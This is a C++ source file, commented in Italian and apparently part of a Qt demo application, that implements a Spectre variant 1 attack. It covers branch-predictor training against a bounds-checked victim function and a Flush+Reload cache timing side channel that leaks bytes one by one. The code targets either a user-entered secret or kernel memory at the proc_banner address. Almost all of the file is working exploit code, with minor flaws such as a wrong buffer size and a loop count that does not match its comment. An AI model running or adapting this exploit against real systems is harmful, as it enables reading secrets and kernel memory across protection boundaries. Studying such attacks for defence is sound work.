#include "spectre_attack.h"

uint8_t spectre_attack::vittima(uint64_t x)
{
    /*
      questo frammento di codice esegue un controllo che previene la lettura fuori da array.
      un valore di x "out of buond" potrebbe scaturire un'eccezione, oppure si può fare che il processore
      acceda alla memoria, ad esempio fornendo x = (address of a secret byte to read) − (base address of array1).
      */
    if (x < array_size){
        return effetto_collaterale[array[x] * PAGE_SIZE];
    }
    return 0;
}

uint8_t spectre_attack::read(uint64_t x_maligna, bool flag_leak_kernel=false){
    size_t prove, i;

    //eseguo 1000 tentativi di lettura
    for (prove = 0; prove < 999; prove++) {

        if(flag_leak_kernel==true){
           char buf[PAGE_SIZE];
           /*system call Linux per mettere in cache le info di proc_banner */
           pread(file_descriptor, &buf, sizeof(buf), 0);
        }

       //Flush, l'array effetto_collaterale non deve essere nella cache ma nella RAM (per l'attacco alla cache)
        for (i = 0; i < BYTE_VALUES; i++)
            _mm_clflush(&effetto_collaterale[i * PAGE_SIZE]);

       //fase di addestramento del branch predictor: eseguo 30 loop di cui 6 di training
        for (i = 1; i <= BRANCH_PREDICTOR_TRAIN * 5; i++) {
            //array_size non deve essere presente nella cache ma nella RAM,
            //manipolo lo stato della cache causando un cache miss per il training
            _mm_clflush(&array_size);
            //pausa per indurre la speculazione
            for (volatile int tmp = 0; tmp < 100; tmp++) {}  //alternativa : sched_yield();
            // fase core di training (and bit a bit)
            mem_in_cache = vittima(x_maligna & (i % BRANCH_PREDICTOR_TRAIN - 1));
        }

        //fase di lettura del dato: cache side channel attack, trovo il valore in cache (Flush + Reload)
        for (i = 1; i < BYTE_VALUES; i++){
            //Time
            __sync_synchronize();
            register uint64_t tempo_inizio = __rdtsc();
            //Reload
            mem_in_cache = effetto_collaterale[i * PAGE_SIZE];
            //Time
            __sync_synchronize();
            register uint64_t tempo_di_lettura = __rdtsc() - tempo_inizio;
           //Flush, effetto_collaterale non deve essere presente in cache
            _mm_clflush(&effetto_collaterale[i * PAGE_SIZE]);

            //la lettura ci impiega troppo tempo, cache miss
            if(tempo_di_lettura > 1000){
                break;
            }
            //controllo se è un cache hit, se lo è allora restituisco il valore leaked
            if (tempo_di_lettura <= CACHE_HIT_THRESHOLD ){
                return i;
            }
        }
    }
    return 0;
}

void spectre_attack::attack(QTextBrowser* text,QString stringa, bool flag_leak_kernel){
    uint64_t addr;
    uint8_t byte;
    //se non è il leak al kernel, procedo con la password
    if(flag_leak_kernel==false){
        char secret[sizeof(stringa)];
        for(int i=0;i<stringa.length();i++){
            secret[i]=stringa.at(i).toLatin1();
        }
        //ricavo l'indirizzo in cui risiede il dato
        addr = (uint64_t)&secret;
    }
    else{ //leak del kernel
        file_descriptor = open("/proc/version", O_RDONLY);
        addr = LINUX_PROC_BANNER;
    }
    //x = (address of a secret byte to read) − (base address of array).
    uint64_t x = addr - (uint64_t)&array;

    text->moveCursor(QTextCursor::End);
    do{
        byte = this->read(x,flag_leak_kernel);
        text->insertPlainText(QString(byte));
        x++;
    }while (byte != 0);
    text->moveCursor(QTextCursor::End);
}
